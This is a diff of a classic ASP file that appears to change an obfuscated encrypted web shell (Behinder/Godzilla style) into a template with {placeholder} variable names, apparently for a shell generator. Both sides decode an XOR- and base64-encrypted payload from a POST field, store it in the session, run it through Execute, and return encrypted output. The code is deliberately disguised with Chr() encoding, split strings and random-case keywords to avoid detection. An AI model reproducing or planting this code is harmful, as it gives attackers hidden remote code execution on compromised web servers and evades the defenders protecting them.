@@ -1,60 +1,60 @@
 <%
-Set ToPsEc = SeRveR.CrEateObJeCt("Scr"&"ipti"&"ng.Di"&"ct"&"ion"&"ar"&Chr("121"))
-FunCtioN Base64Decode(ByVal H3cyi)
-    <!--"-->
-    Dim qianxin, SaNgfoR
-    <!--"-->
-    Set qianxin = CReAteOBjeCt("Ms"&"xm"&"l"&Chr("50")&".DO"&"MDo"&"cume"&"nt.3."&Chr("48"))
-    Set SaNgfoR = qianxin.CreateElement("base"&Chr("54")&Chr("52"))
-    SaNgfoR.dataType = "bi"&"n.ba"&"se"&Chr("54")&Chr("52")
-    SaNgfoR.text = H3cyi
-    Base64Decode = SaNgfoR.nodeTypedValue
-    Set SaNgfoR = Nothing
-    Set qianxin = Nothing
-End FunCtioN
-FunCtioN DbAPPsEcUritY(nsfocCuS,isBin)
-    dim H3c,AlIBABA,BaIDU,ThrEatBOOk
-    ThrEatBOOk = len(key)
-    Set ChAitIn = CrEATeObjecT("AD"&"OD"&"B.St"&"re"&Chr("97")&Chr("109"))
-    ChAitIn.CharSet = "is"&"o-8"&"85"&"9-"&Chr("49")
-    ChAitIn.Type = Chr("50")
-    ChAitIn.OpeN
-    if IsArray(nsfocCuS) then
-        H3c=UBound(nsfocCuS)+1
-        For AlIBABA=Chr("49") To H3c
+FunCtioN {strliu}({strer},isBin)
+    dim {strshisan},{strshier},{strqi},{strba}
+    {strba} = len({strshisi})
+    Set {strjiu} = CrEATeObjecT(Chr(65)&Chr(68)&"ODB.St"&"re"&Chr(97)&Chr(109))
+    {strjiu}.CharSet = Chr(105) & Chr(115) & Chr(111)&"-8859-"&Chr(49)
+    {strjiu}.Type = Chr("50")
+    {strjiu}.OpeN
+    if IsArray({strer}) then
+        {strshisan}=UBound({strer})+1
+        For {strshier}=Chr("49") To {strshisan}
             <!--"-->
-            ChAitIn.WriteText chrw(aScb(mIdb(nsfocCuS,AlIBABA,Chr("49"))) XOR Asc(Mid(key,(AlIBABA mod ThrEatBOOk)+Chr("49"),Chr("49"))))
-        Next REM ChAitIn.CharSet
+            {strjiu}.WriteText chrw(aScb(mIdb({strer},{strshier},Chr("49"))) XOR Asc(Mid({strshisi},({strshier} mod {strba})+Chr("49"),Chr("49"))))
+        Next REM {strjiu}.CharSet
     end if
-    ChAitIn.Position = Chr("48")
+    {strjiu}.Position = Chr(48)
     <!--"-->
     if isBin then
-        ChAitIn.Type = Chr("49")
-        DbAPPsEcUritY=ChAitIn.Read()
-    else REM ChAitIn.OpeN
-        DbAPPsEcUritY=ChAitIn.ReadText()
+        {strjiu}.Type = Chr(49)
+        {strliu}={strjiu}.ReaD()
+    else REM {strjiu}.OpeN
+        {strliu}={strjiu}.ReadText()
     end if
-'AAAASDkey="3c6AADe0b8a9c1AASDA5224a"
 End FunCtioN
-    key="{secretKey}"
-    nsfocCuS=reQUest.FoRm("{pass}")
-    ReSpoNse.Status = "301 Moved Permanently"
-    if not IsEmpty(nsfocCuS) then
-
-        if  IsEmpty(SEssiOn("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))) then
-            nsfocCuS=DbAPPsEcUritY(Base64Decode(nsfocCuS),false)
-            SEssiOn("payload")=nsfocCuS
-            response.End
-        else
-            nsfocCuS=DbAPPsEcUritY(Base64Decode(nsfocCuS),true)
-            ToPsEc.Add "payload",SEssiOn("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))
-            Execute(ToPsEc(("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))))
-            BaIDU=run(nsfocCuS)
-            rEspOnsE.Write(Chr(123) & Chr(34) & "message" & Chr(34) & Chr(58) & Chr(34))
-            if not IsEmpty(BaIDU) then
-                response.Write bAsE64EnCoDe(DbAPPsEcUritY(BaIDU,true))
-            end if
-            rEspOnsE.Write(Chr(34) & Chr(125))
+{strshi}="p"&Chr("97")&ChR("121")&Chr(108)&Chr(111)&Chr(97)&"d"
+Set {stryi} = SeRveR.CrEateObJeCt(Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr("112")&"ti"&"ng.Di"&"ct"&"ion"&Chr("97")&Chr("114")&Chr("121"))
+FunCtioN {strsan}(ByRef {strwu})
+    <!--"-->
+    Dim {strshiyi}, {strsi}
+    <!--"-->
+    Set {strshiyi} = CReAteOBjeCt("M"& Chr(115) & Chr(120) & Chr(109) & Chr(108) & Chr(50) & Chr(46) & Chr(68) & Chr(79) & Chr(77) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & "nt.3.0")
+    Set {strsi} = {strshiyi}.CreateElement("base"&Chr("54")&Chr("52"))
+    {strsi}.dataType = "bi"&"n.ba"&"se"&Chr("54")&Chr("52")
+    {strsi}.text = {strwu}
+    {strsan} = {strsi}.nodeTypedValue
+    Set {strsi} = Nothing
+    Set {strshiyi} = Nothing
+End FunCtioN
+{strshisi} ="{secretKey}"
+{strer}=reQUest.FoRm("{pass}")
+ReSpoNse.Status = "301 Moved Permanently"
+if not IsEmpty({strer}) then
+    if  IsEmpty(SEssiOn({strshi})) then
+        {strer}={strliu}({strsan}({strer}),false)
+        SEssiOn({strshi})={strer}
+        response.End
+    else
+        {strer}={strliu}({strsan}({strer}),true)
+        {stryi}.Add {strshi},SEssiOn({strshi})
+        EXECUTE({stryi}(({strshi})))
+        {strqi}=run({strer})
+        rEspOnsE.Write(Chr(123) & Chr(34) & "message" & Chr(34) & Chr(58) & Chr(34))
+        if not IsEmpty({strqi}) then
+            response.Write bAsE64EnCoDe({strliu}({strqi},true))
         end if
+        rEspOnsE.Write(Chr(34) & Chr(125))
     end if
+end if
+
 %>
